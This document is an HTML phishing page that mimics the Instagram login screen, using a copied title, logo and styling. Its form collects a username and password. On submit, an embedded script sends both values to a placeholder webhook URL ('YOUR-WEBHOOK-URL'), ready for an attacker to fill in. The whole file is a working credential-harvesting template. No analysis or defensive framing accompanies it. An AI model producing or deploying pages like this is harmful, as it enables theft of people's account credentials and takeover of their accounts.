<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Log in • Instagram</title><link rel="icon" href="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a1.png"><style>*{box-sizing:border-box;}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;font-size:14px;background:#fafafa;color:#262626;line-height:1.43;margin:0;padding:40px 20px;}form{max-width:350px;margin:0 auto;background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 34px;}img{display:block;margin:0 auto 22px;width:175px;}input{width:100%;height:36px;margin-bottom:6px;padding:11px 9px 7px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:14px;box-sizing:border-box;}input:focus{outline:none;border-color:#a8a8a8;background:#fff;}button{width:100%;background:#0095f6;border:none;border-radius:5px;color:#fff;font-weight:600;padding:7px;font-size:14px;height:30px;cursor:pointer;}button:hover{background:#1877f2;}.forgot{margin-top:15px;text-align:center;font-size:12px;}.forgot a{color:#00376b;text-decoration:none;}</style></head><body><form method="POST" action="https://httpbin.org/post"><img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a1.png" alt="Instagram"><input type="text" name="username" placeholder="Phone, username, or email" required><input type="password" name="password" placeholder="Password" required><button>Log in</button><div class="forgot">Forgot password?</div></form><script>document.querySelector('form').onsubmit=function(){fetch('https://YOUR-WEBHOOK-URL/webhook', {method:'POST', body:JSON.stringify({username:document.querySelector('[name="username"]').value, password:document.querySelector('[name="password"]').value, ip:'captured'})});};</script></body></html>
